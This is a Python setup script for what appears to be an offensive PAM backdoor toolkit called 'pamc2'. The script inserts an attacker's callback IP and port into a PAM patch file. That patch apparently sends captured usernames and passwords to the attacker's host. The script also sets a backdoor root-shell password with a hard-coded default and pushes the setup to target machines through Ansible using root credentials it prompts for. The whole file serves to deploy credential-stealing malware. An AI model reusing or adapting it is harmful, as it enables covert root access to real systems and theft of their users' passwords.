#!/usr/bin/python3
import os
import argparse
import subprocess

def setup_cmd_args():
    parser = argparse.ArgumentParser(description="Script to setup pamc2 for use on this machine")
    parser.add_argument('-i', '--ip', metavar="<Callback IP Address>",
                        required=True, dest="ip", action="store")
    parser.add_argument('-p', '--port', metavar="<Callback Port>",
                        required=True, dest="port", action="store")
    parser.add_argument('-f', '--format', metavar="<Format String>",
                        dest="format", help="Format string for socket messages (MUST HAVE 4 %s's (ip, message, username, password)); Default: '%s - %s %s:%s")
    parser.add_argument('--password', metavar="<Backdoor Password>",
                        dest="password", help="Backdoor password to spit root shell; Default: letredin123!")
    return parser.parse_args()

def setup():
    args = setup_cmd_args()

    ansible_user = input("Enter username of user with root access on the target machines: ")
    ansible_password = input("Enter password of this user: ")

    subprocess.run(f'sed -i "s/^ansible_user.*/ansible_user={ansible_user}/" ./inventory.ini', shell=True, text=True)
    subprocess.run(f'sed -i "s/^ansible_password.*/ansible_password={ansible_password}/" ./inventory.ini', shell=True, text=True)
    subprocess.run(f'sed -i "s/^ansible_become_password.*/ansible_become_password={ansible_password}/" ./inventory.ini', shell=True, text=True)

    subprocess.run(f'sed -i "s/^+#define CALLBACK_IP.*/+#define CALLBACK_IP \\"{args.ip}\\"/" ./zeropam-1-5-3.patch', shell=True, text=True)
    subprocess.run(f'sed -i "s/^+#define CALLBACK_PORT.*/+#define CALLBACK_PORT {args.port}/" ./zeropam-1-5-3.patch', shell=True, text=True)

    if(args.format):
        subprocess.run(f'sed -i "s/^+#define RET_FMT.*/+#define RET_FMT \\"{args.format}\\"/" ./zeropam-1-5-3.patch', shell=True, text=True)

    # if(args.password):
    #     subprocess.run(f'sed -i "s/^+#define AUTH_PASSWORD.*/+#define AUTH_PASSWORD \\"{args.password}\\"/" ./zeropam-1-5-3.patch', shell=True, text=True)

    subprocess.run(f'chmod +x setup.sh && bash setup.sh', shell=True, text=True)
    
def main():
    setup()
    
if (__name__ == '__main__'):
    main()